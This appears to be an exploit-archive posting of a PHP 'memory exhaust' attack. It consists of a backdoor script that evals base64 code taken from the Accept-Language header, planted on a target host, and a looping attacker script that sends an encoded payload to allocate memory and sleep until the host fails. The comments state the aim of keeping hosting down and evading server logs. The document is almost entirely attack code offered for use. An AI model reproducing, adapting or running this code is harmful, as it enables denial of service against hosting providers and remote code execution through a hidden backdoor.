PHP 5.2.6 sleep() Local Memory Exhaust Exploit
==============================================





There is some kind of issue in PHP
we can run out memory even on SAFE_MODE
script simply allocate maximum of memory
and go to sleep for, let&#039;s say 9999999 seconds.
sleep() pass &#039;max_execution_time&#039; setting.

<?php
/* put this one on target hosting */
if ( ! $data = @getenv(&#039;HTTP_ACCEPT_LANGUAGE&#039;))
    $data = $_SERVER[&#039;HTTP_ACCEPT_LANGUAGE&#039;];
    die(&#039;no propety data&#039;);
eval(base64_decode($data));
?>

<?
    /* run from another, or even the same hosting */
    @ini_set(&#039;max_execution_time&#039;, 0);
    @set_time_limit(0);
    @ignore_user_abort(true);
    
    $url = &#039;&#039;; /* url to script above on target hosting */
    $port = 80;
    
    $url = empty($_REQUEST[&#039;url&#039;]) ? $url : $_REQUEST[&#039;url&#039;];
    $port = abs(intval(empty($_REQUEST[&#039;port&#039;]) ? $url : $_REQUEST[&#039;port&#039;]));
    
    if ( ! function_exists(&#039;fsockopen&#039;))
        die(&#039;sorry, fsockopen() function disabled :/&#039;);
    
    ?><? if ( empty($url) OR empty($port)): ?>
    Ram eater sploit<br />
    <form action="" method="POST">
    <input type="text" name="url" value="Url to script on target hosting" 
onfocus="this.value=&#039;http://&#039;" /><br />
    <input type="text" name="url" value="Port" onfocus="this.value=80" /><br 
/>
    <input type="Submit" value="Run" />
    </form>
    <? exit;endif; ?><?
    
    if ( ! $purl = @parse_url($url))
        die(&#039;sorry, parse_url() function disabled O_o&#039;);
    if ( ! $hostIp = @gethostbyname($purl[&#039;host&#039;]))
        die(&#039;sorry, gethostbyname() function disabled or no such host&#039;);
    
    $exploit = 
&#039;JG1MaW1pdD0nNTEyTSc7aW5pX3NldCgnbWVtb3J5X2xpbWl0JywkbUxpbWl0KTtpZighJG1MaW1&#039;.
               &#039;pdCA9IGluaV9nZXQoJ21lbW9yeV9saW1pdCcpKSRtTGltaXQgPSAnMk0nOyRtTGltaXRJbktiID&#039;.
               &#039;0gc3Vic3RyKCRtTGltaXQsIDEpKjEwMjQqMC44O2ZvcigkaT0wOyRpPCRtTGltaXRJbktiOyRpK&#039;.
               &#039;yspJG0uPXN0cl9yZXBlYXQoJ20nLDEwMjQpO3NsZWVwKDk5OTk5OTk5KTs=&#039;;
    
    $sock = "GET {$purl[&#039;path&#039;]} HTTP/1.1\n";
    $sock.= "User-Agent: Opera/9.63 (Windows NT 5.1; U; pl) Presto/2.1.1\n";
    $sock.= "Host: {$purl[&#039;host&#039;]}\n";
    $sock.= "Accept-Language: {$exploit}\n"; /* it will be no server LOG... 
i hope... */
    $sock.= "Connection: Close\n\n";
    $slen = strlen($sock);
    
    while ( true ) {
        if ( ! $fp = @fsockopen($hostIp, (int)$port, $_e, $__e)) {
            echo "error on fsockopen() function {$_e} {$__e}\n\n";
            @sleep(5);
            continue;
        }
        if ( ! @fwrite($fp, $sock, $slen))
            echo "sorry, can\&#039;t write data to socket\n";
        @usleep(300000); /* 300ms */
        fclose($fp);
        echo &#039;X&#039;; /* output, how many times script loop */
    }
    /* keep this script running until target hosting die
       or leave it running if you want keep hosting down all the time
       enjoy and wear your sunglasses at night  :) 
       best regards, gogulas. */
?>



